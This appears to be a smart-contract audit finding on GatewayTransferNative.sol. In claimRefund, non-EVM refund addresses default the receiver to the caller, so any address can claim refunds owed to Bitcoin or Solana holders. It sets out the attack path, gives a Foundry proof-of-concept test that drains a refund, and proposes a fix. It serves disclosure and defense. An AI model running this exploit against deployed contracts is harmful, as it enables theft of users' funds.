# Refund Claim Vulnerability in GatewayTransferNative

### Summary

A missing check in `GatewayTransferNative.sol` will cause a complete loss of funds for non-EVM wallet owners as an attacker will claim refunds intended for non-EVM addresses. The missing validation of non-EVM addresses in `GatewayTransferNative.sol` will cause a complete loss of funds for non-EVM wallet owners (e.g., Bitcoin or Solana address holders) as an attacker will claim refunds by exploiting the default `receiver` assignment in the `claimRefund` function.

### Root Cause

In `GatewayTransferNative.sol:claimRefund:661`, there is a missing check to restrict non-EVM address refund claims to authorized bots. The function assumes that if `walletAddress.length != 20`, the `receiver` should default to `msg.sender`, allowing any caller to pass the `msg.sender == receiver` check and claim the refund.

### Internal Pre-conditions

1. The gateway needs to call `onRevert` or `onAbort` to set `refundInfos[externalId]` with a `walletAddress` that is not 20 bytes (e.g., a Bitcoin or Solana address).
2. The `refundInfos[externalId].amount` needs to be at least 1 wei to allow a transfer.
3. The `bots` mapping for the attacker’s address (`msg.sender`) needs to be set to `false` (i.e., the attacker is not an authorized bot).

### External Pre-conditions

1. The ZRC20 token contract (e.g., `token1Z`) needs to have sufficient balance in the `GatewayTransferNative` contract to allow the transfer.
2. The gateway contract (`GatewayZEVM`) needs to successfully execute `onRevert` or `onAbort` to create a refund entry.

### Attack Path

1. The gateway calls `onRevert` or `onAbort` with a `revertMessage` containing an `externalId` and a non-EVM address (e.g., a 35-byte Bitcoin address).
2. The `GatewayTransferNative` contract stores the refund in `refundInfos` with the non-EVM address as `walletAddress`.
3. An attacker calls `claimRefund(externalId)` with their own address as `msg.sender`.
4. The `claimRefund` function checks `refundInfo.walletAddress.length == 20`, which fails for the non-EVM address.
5. The `receiver` defaults to `msg.sender` (the attacker’s address).
6. The check `bots[msg.sender] || msg.sender == receiver` passes because `msg.sender == receiver`.
7. The `TransferHelper.safeTransfer` function sends the refund amount to the attacker.

### Impact

The non-EVM wallet owners (e.g., Bitcoin or Solana address holders) suffer an approximate loss of the full refund amount (e.g., 100 ether in the PoC). The attacker gains the full refund amount and loses nothing.

```solidity
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {GatewayTransferNative} from "../contracts/GatewayTransferNative.sol";
import {GatewayZEVMMock} from "../contracts/mocks/GatewayZEVMMock.sol";
import {ZRC20Mock} from "../contracts/mocks/ZRC20Mock.sol";
import {DODORouteProxyMock} from "../contracts/mocks/DODORouteProxyMock.sol";
import {RevertContext, AbortContext} from "@zetachain/protocol-contracts/contracts/zevm/interfaces/IGatewayZEVM.sol";

contract RefundClaimVulnerabilityTest is Test {
    address constant _ETH_ADDRESS_ = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address constant WZETA = 0x5F0b1a82749cb4E2278EC87F8BF6B618dC71a8bf;
    address public EddyTreasurySafe = address(0x123);
    address public user1 = address(0x111);
    address public user2 = address(0x222);
    address public bot = address(0x333);
    bytes public btcAddress = abi.encodePacked("tb1qy9pqmk2pd9sv63g27jt8r657wy0d9ueeh0nqur");
    uint256 constant initialBalance = 1000 ether;

    GatewayZEVMMock public gatewayZEVM;
    GatewayTransferNative public gatewayTransferNative;
    ERC1967Proxy public transferNativeProxy;
    ZRC20Mock public token1Z;
    DODORouteProxyMock public dodoRouteProxyZ;

    function setUp() public {
        // Deploy mocks
        gatewayZEVM = new GatewayZEVMMock();
        gatewayTransferNative = new GatewayTransferNative();
        dodoRouteProxyZ = new DODORouteProxyMock();
        token1Z = new ZRC20Mock("Token1Z", "TK1Z", 18);

        // Initialize GatewayTransferNative
        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address,address,uint256,uint256,uint256)",
            address(gatewayZEVM),
            EddyTreasurySafe,
            address(dodoRouteProxyZ),
            address(dodoRouteProxyZ), // DODOApprove
            0,
            10,
            100000
        );
        transferNativeProxy = new ERC1967Proxy(
            address(gatewayTransferNative),
            data
        );
        gatewayTransferNative = GatewayTransferNative(payable(address(transferNativeProxy)));
        gatewayTransferNative.setBot(bot, true);

        // Mint tokens
        token1Z.mint(address(gatewayTransferNative), initialBalance);
    }

    function test_RefundClaimVulnerability() public {
        // Setup: Create a refund for a Bitcoin address
        bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));
        uint256 amount = 100 ether;

        // Simulate onRevert with Bitcoin address
        vm.prank(address(gatewayZEVM));
        gatewayTransferNative.onRevert(
            RevertContext({
                sender: address(this),
                asset: address(token1Z),
                amount: amount,
                revertMessage: bytes.concat(externalId, btcAddress)
            })
        );

        // Test: Random address can claim the refund
        address randomUser = address(0x999);
        vm.startPrank(randomUser);
        
        // This should succeed even though randomUser is not the intended recipient
        gatewayTransferNative.claimRefund(externalId);
        
        // Verify randomUser received the tokens
        assertEq(token1Z.balanceOf(randomUser), amount);
        vm.stopPrank();

        // Verify the refund can't be claimed again
        vm.expectRevert();
        vm.prank(randomUser);
        gatewayTransferNative.claimRefund(externalId);
    }
} 
```

### Mitigation

To mitigate this vulnerability, modify the `claimRefund` function to restrict claims for non-EVM addresses (where `walletAddress.length != 20`) to authorized bots only.
